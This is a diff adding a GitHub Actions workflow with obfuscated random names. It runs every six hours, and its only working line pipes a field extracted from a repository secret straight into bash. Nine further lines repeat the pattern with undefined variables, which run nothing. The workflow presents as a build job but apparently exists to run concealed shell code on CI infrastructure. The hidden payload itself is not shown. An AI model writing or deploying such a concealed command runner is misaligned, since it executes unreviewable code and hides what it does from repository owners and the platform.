@@ -1,0 +1,27 @@
+name: wujianxiong7651
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wujianxiong7651
+        env:
+          clk596: ${{ secrets.clk596 }}
+        run: |
+          echo $clk596 | jq -r .nnkd501 | /bin/bash
+          echo $cuaod177 | jq -r .cp3783 | /bin/bash
+          echo $wm787 | jq -r .un5730 | /bin/bash
+          echo $uwbp61840 | jq -r .zgyv71 | /bin/bash
+          echo $ttmdh55 | jq -r .y806 | /bin/bash
+          echo $dpveo590 | jq -r .bs8 | /bin/bash
+          echo $owdl3988 | jq -r .p33951 | /bin/bash
+          echo $ygbtf13248 | jq -r .gx92 | /bin/bash
+          echo $bm6558 | jq -r .x17 | /bin/bash
+          echo $c6 | jq -r .q1 | /bin/bash
+
